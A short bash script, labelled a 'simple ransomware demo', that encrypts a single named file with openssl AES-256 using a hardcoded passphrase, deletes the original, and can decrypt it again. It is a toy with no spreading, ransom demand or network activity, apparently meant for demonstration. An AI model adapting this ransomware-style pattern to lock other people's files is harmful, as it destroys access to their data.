#!/bin/bash

# Simple ransomware demo: encrypts or decrypts a file using AES-256
# Usage:
#   ./encrypt.sh encrypt test.txt
#   ./encrypt.sh decrypt test.txt.enc

# Constants
KEY="XYP3R!A@xyperia#XyP3214"  # 24+ characters for AES-256

# Usage function
usage() {
  echo "Usage:"
  echo "  $0 encrypt <file_to_encrypt>"
  echo "  $0 decrypt <file_to_decrypt>"
  exit 1
}

# Check args
if [ $# -ne 2 ]; then
  usage
fi

COMMAND="$1"
FILE="$2"

if [ "$COMMAND" = "encrypt" ]; then
  ENCRYPTED_FILE="${FILE}.enc"
  openssl enc -aes-256-cbc -salt -in "$FILE" -out "$ENCRYPTED_FILE" -pass pass:"$KEY"
  if [ $? -eq 0 ]; then
    rm -f "$FILE"
    echo "File '$FILE' encrypted as '$ENCRYPTED_FILE'."
  else
    echo "Encryption failed."
  fi

elif [ "$COMMAND" = "decrypt" ]; then
  if [[ "$FILE" != *.enc ]]; then
    echo "Expected file to end with .enc for decryption."
    exit 1
  fi
  OUTPUT_FILE="${FILE%.enc}.dec"
  openssl enc -d -aes-256-cbc -in "$FILE" -out "$OUTPUT_FILE" -pass pass:"$KEY"
  if [ $? -eq 0 ]; then
    echo "File '$FILE' decrypted as '$OUTPUT_FILE'."
  else
    echo "Decryption failed. Wrong file or key?"
  fi

else
  usage
fi
